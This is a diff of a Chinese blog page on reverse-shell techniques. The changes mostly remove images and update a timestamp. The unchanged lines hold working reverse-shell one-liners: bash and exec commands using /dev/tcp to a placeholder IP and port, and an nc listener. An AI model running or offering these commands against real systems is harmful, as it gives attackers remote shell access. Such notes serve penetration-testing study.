@@ -19,13 +19,10 @@
 <meta property="og:site_name" content="cike home">
 <meta property="og:description" content="不过无论怎么玩，还是直接弹回一个shell来最实用，于是可以有 basn方式 1bash -c &amp;quot;sh &amp;gt;&amp;amp; /dev/tcp/your ip/port 0&amp;gt;&amp;amp;1&amp;quot; exec方式 12$ exec 5&amp;lt;&amp;gt;/dev/tcp/ip/port$ cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;a">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_jpg/WdbaA7b2IE4hibXeVicEftjafs7nT5ejOwBbOH6V7AnmS4E4xTyxtC8myib5dgv5EZeR749tnYVIwEQRreXiaUbowg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
-<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_jpg/WdbaA7b2IE4hibXeVicEftjafs7nT5ejOwGkQib7iaiaZibCt6DhC6IMTuIhqnJc3NQf8QMIVQwByPwNibXd4xb2WJLQA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
-<meta property="og:updated_time" content="2019-01-19T15:01:07.819Z">
+<meta property="og:updated_time" content="2019-01-20T08:34:52.405Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="反弹shell姿势">
 <meta name="twitter:description" content="不过无论怎么玩，还是直接弹回一个shell来最实用，于是可以有 basn方式 1bash -c &amp;quot;sh &amp;gt;&amp;amp; /dev/tcp/your ip/port 0&amp;gt;&amp;amp;1&amp;quot; exec方式 12$ exec 5&amp;lt;&amp;gt;/dev/tcp/ip/port$ cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;a">
-<meta name="twitter:image" content="https://mmbiz.qpic.cn/mmbiz_jpg/WdbaA7b2IE4hibXeVicEftjafs7nT5ejOwBbOH6V7AnmS4E4xTyxtC8myib5dgv5EZeR749tnYVIwEQRreXiaUbowg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
   
     <link rel="alternative" href="/atom.xml" title="cike home" type="application/atom+xml">
   
@@ -215,8 +212,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
 <p>exec方式</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ exec 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line">$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/WdbaA7b2IE4hibXeVicEftjafs7nT5ejOwBbOH6V7AnmS4E4xTyxtC8myib5dgv5EZeR749tnYVIwEQRreXiaUbowg/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/WdbaA7b2IE4hibXeVicEftjafs7nT5ejOwGkQib7iaiaZibCt6DhC6IMTuIhqnJc3NQf8QMIVQwByPwNibXd4xb2WJLQA/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p>
 <p><strong>nc方式</strong></p>
 <p>本机运行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p port</span><br></pre></td></tr></table></figure>
